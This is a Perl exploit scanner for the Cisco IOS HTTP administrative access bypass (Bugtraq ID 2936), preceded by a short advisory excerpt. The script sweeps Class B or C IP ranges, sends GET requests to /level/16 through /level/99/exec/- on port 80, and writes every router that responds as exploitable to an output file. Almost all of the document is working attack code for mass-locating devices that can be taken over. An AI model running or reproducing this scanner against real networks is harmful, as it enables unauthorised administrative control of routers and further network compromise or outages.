# source: https://www.securityfocus.com/bid/2936/info
#   
# IOS is router firmware developed and distributed by Cisco Systems. IOS functions on numerous Cisco devices, including routers and switches.
#   
# It is possible to gain full remote administrative access on devices using affected releases of IOS. By using a URL of http://router.address/level/$NUMBER/exec/.... where $NUMBER is an integer between 16 and 99, it is possible for a remote user to gain full administrative access.
#   
# This problem makes it possible for a remote user to gain full administrative privileges, which may lead to further compromise of the network or result in a denial of service. 
# 

#!/usr/bin/perl
#
# Bulk Scanner for the Cisco IOS HTTP Configuration Arbitrary
# Administrative Access Vulnerability
# Found: 06-27-01 - Bugtraq ID: 2936
# Written by hypoclear on 07-03-01
#
# usage: ./IOScan.pl <start ip> <end ip>
# Note: start and end ip must be a Class B or C network
# example: ./IOScan 192.168.0.0 192.168.255.255
#
# hypoclear - hypoclear@jungle.net - http://hypoclear.cjb.net
# This and all of my programs fall under my disclaimer, which
# can be found at: http://hypoclear.cjb.net/hypodisclaim.txt

use IO::Socket; 

die "\nusage: $0 <start ip> <end ip>
Note:  start and end ip must be a Class B or C network
ex:   ./IOScan 192.168.0.0 192.168.255.255\n\n" unless @ARGV > 0;
$num = 16; $ipcount = 0; $vuln = 0;

if (defined $ARGV[1])
 { $currentIP = $ARGV[0]; $endIP = $ARGV[1];
   while(1)
    { @CURIP = split(/\./,$currentIP);
      if (($CURIP[2] > 255) && ($CURIP[3] > 255))
       { scanEnd();
       }
      print "Scanning $currentIP\n";
      scan($currentIP);
      if ($currentIP eq $endIP)
       { scanEnd();
       }
      if ($CURIP[3] < 255)
       { $CURIP[3]++;
       }
      else
       { $CURIP[2]++;
         $CURIP[3]=0;
       }
      $currentIP = "";
      foreach $item (@CURIP)
        { $currentIP .= "$item.";
        }
      $currentIP =~ s/\.$//;
      $ipcount++;
     }
 }


sub scan
  { while ($num <100)
      { $IP = $_[0];
        sender("GET /level/$num/exec/- HTTP/1.0\n\n");
        if ($webRecv =~ /200 ok/)
         { $vuln++;
           open(OUT,">>ios.out") || die "Can't write to file";
           print OUT "$IP is Vulnerable\n";
           close(OUT);
           $num = 101;
         }
        $num++;
      }
     $num = 16;
  }


sub sender
  { $sendsock = IO::Socket::INET -> new(Proto     => 'tcp',
                                        PeerAddr  => $IP,
                                        PeerPort  => 80,
                                        Type      => SOCK_STREAM,
                                        Timeout   => 1);
        unless($sendsock){die "Can't connect to $ARGV[0]"}
   $sendsock->autoflush(1);

   $sendsock -> send($_[0]);
   $webRecv = ""; while(<$sendsock>){$webRecv .= $_} $webRecv =~ s/\n//g;
   close $sendsock;
  }


sub scanEnd
  { print "\nScanned $ipcount ip addresses, $vuln addresses found vulnerable.\n";
    if ($vuln > 0) {print "Check ios.out for vulnerable addresses.";}
    die "\n";
  }